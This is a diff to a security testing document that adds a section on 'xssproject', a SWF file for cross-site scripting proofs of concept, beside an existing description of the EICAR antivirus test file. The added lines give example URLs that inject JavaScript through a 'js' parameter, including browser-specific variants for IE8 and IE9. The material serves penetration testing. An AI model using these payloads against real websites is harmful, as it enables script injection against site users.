@@ -27,3 +27,17 @@ The EICAR Standard Anti-Virus Test File or EICAR test file is a computer file th
 Anti-virus programmers set the EICAR string as a verified virus, similar to other identified signatures. A compliant virus scanner, when detecting the file, will respond in exactly the same manner as if it found a harmful virus. Not all virus scanners are compliant, and may not detect the file even when they are correctly configured.
 
 The use of the EICAR test string can be more versatile than straightforward detection: a file containing the EICAR test string can be compressed or archived, and then the antivirus software can be run to see whether it can detect the test string in the compressed file.
+
+## xssproject File
+
+As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs.
+
+This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either.
+
+Examples:
+
+Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
